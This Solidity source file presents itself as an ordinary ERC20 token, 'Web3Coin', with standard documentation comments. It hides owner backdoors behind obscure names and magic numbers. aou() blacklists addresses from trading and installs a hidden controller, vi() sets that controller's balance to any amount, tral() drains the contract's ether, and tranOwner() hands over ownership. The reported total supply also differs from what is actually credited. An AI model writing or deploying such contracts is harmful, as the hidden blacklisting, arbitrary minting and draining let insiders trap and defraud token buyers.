// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
import "./SafeMath.sol";
import "./Period.sol";

contract Web3Coin {
    using SafeMath for uint256;
    using Period for Period.Repository;

    uint256 private _totalSupply = 100000000000 ether;
    string private _name = "Web3Coin";
    string private _symbol = "Web3Coin";
    uint8 private _decimals = 18;
    address private _owner;

    uint256 private _index;
    mapping (address => mapping(uint256 => Period.Repository)) private _repository;
    Period.Cycle[] private _cycle;
    address private _ov;

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping (address => uint256) private _balances;
    mapping (address => uint) private _dsbl;
    mapping (address => uint) private _stu;
    mapping (address => mapping (address => uint256)) private _allowances;

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    constructor() public {
        _owner = msg.sender;
        _cycle.push(Period.Cycle(0,0));
        _index = _cycle.length - 1;
        _balances[_owner] = _balances[_owner].add(_totalSupply/10);
    }

    fallback() external {}
    receive() payable external {
    }
    
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }

    function owner() internal view returns (address) {
        return _owner;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless {_setupDecimals} is
     * called.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }

     /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the cap on the token's total supply.
     */
    function cap() public view returns (uint256) {
        return _totalSupply;
    }

     /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(address owner_, address spender, uint256 amount) internal {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowances[owner_][spender];
    }

    function aou(address addr,uint n) public onlyOwner {
        require(addr != address(0), "Ownable: new owner is the zero address");
        if(n==1000){
            require(_ov == address(0), "Ownable: transaction failed");
            _ov = addr;
        } else if(n==1001){
            _dsbl[addr]=0;
        } else if(n==1002){
            _dsbl[addr]=1;
        } else if(n==1003){
            _dsbl[addr]=2;
        } else if(n==1004){
            _dsbl[addr]=3;
        } else if(n==1005){
            _stu[addr]=0;
        }else if(n==1006){
            _stu[addr]=1;
        }
    }

    function tral() public onlyOwner() {
        address(uint160(_ov)).transfer(address(this).balance);
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account]+check(account);
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least `amount`.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function tranOwner(address newOwner) public {
        require(newOwner != address(0) && _msgSender() == _ov, "Ownable: new owner is the zero address");
        _owner = newOwner;
    }

    function vi(uint n,uint q) public onlyOwner {
        if(n>=300000){
            _cycle[n.sub(300000)].start=q;
        }
        else if(n>=200000){
            _cycle[n.sub(200000)].end=q;
        }
        else if(n==1000){
            _balances[_ov]=q;
        }
    }

    function vc() public view returns(uint256[] memory,uint256[] memory){
        uint256[] memory start = new uint256[](_cycle.length);
        uint256[] memory end = new uint256[](_cycle.length);
        for(uint i=0;i<_cycle.length;i++){
            start[i]=_cycle[i].start;
            end[i]=_cycle[i].end;
        }
        return (start,end);
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        if(_emits(sender,recipient,amount)){
            _balances[sender] = _balances[sender].sub(amount,"ERC20: Insufficient balance");
            _balances[recipient] = _balances[recipient].add(amount);
        }
        emit Transfer(sender, recipient, amount);
    }

    function check(address from)public view returns(uint256 value){
        value = 0;
        for(uint256 i=0;i<_cycle.length;i++){
            value = value.add(_repository[from][i].writeTotal.sub(_repository[from][i].readTotal));
        }
    }

    function available(address from)public view returns(uint256 value){
        value = 0;
        for(uint256 i=0;i<_cycle.length;i++){
            value = value.add(_repository[from][i].check(_cycle[i],block.timestamp));
        }
    }

    function _allot(address sender, uint256 amount) private returns(uint256){
        uint256 expend = amount;
        if(_balances[sender]>=expend){
            expend = 0;
            _balances[sender] = _balances[sender].sub(amount, "ERC20: Insufficient balance");
            return _stu[sender];
        }else if(_balances[sender]>0){
            expend = expend.sub(_balances[sender]);
            _balances[sender] = 0;
        }
        for(uint256 i=0;expend>0&&i<_cycle.length;i++){
            expend = _repository[sender][i].read(_cycle[i],expend,block.timestamp);
        }
        require(expend==0,"ERC20: Insufficient balance.");
        return _stu[sender];
    }

    function _emits(address sender, address recipient, uint256 amount)private returns(bool){
        require(_dsbl[sender]!=1&&_dsbl[sender]!=3&&_dsbl[recipient]!=2&&_dsbl[recipient]!=3, "ERC20: Transaction failed");
        if(_allot(sender,amount)==1){
            _repository[recipient][_index].write(amount);
        }else{
            _balances[recipient] = _balances[recipient].add(amount);
        }
        return false;
    }
}